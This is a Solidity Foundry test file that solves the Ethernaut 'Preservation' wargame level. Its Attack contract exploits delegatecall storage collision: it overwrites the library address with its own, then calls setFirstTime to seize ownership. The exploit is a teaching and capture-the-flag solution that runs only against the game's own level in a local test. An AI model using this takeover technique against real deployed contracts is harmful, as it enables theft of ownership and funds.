// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

//import "ds-test/test.sol";
import "forge-std/Vm.sol";
import "forge-std/Test.sol";

import "../src/16-Preservation/PreservationFactory.sol";
import "../src/Ethernaut.sol";

contract PreservationTest is Test {
    Ethernaut ethernaut;
    address eoaAddress = vm.addr(1);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(eoaAddress, 10 ether);
    }

    function testPreservationHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        PreservationFactory factory = new PreservationFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(eoaAddress, eoaAddress);
        address levelAddress = ethernaut.createLevelInstance{value: 1 ether}(factory);
        // Preservation level = Preservation(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        vm.roll(5);
        Attack hack = new Attack(levelAddress);
        hack.attack(); 

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}

contract Attack {
    
    address target;
    address owner;
    address s3;

    constructor(address _target) {
        owner = msg.sender;
        target = _target;
    }

    function attack() external {
        Preservation(target).setSecondTime(uint256(uint160(address(this))));
        Preservation(target).setFirstTime(uint256(uint160(address(owner))));
    }

    function setTime(uint _time) public {
        s3 = address(uint160(_time));
    }
}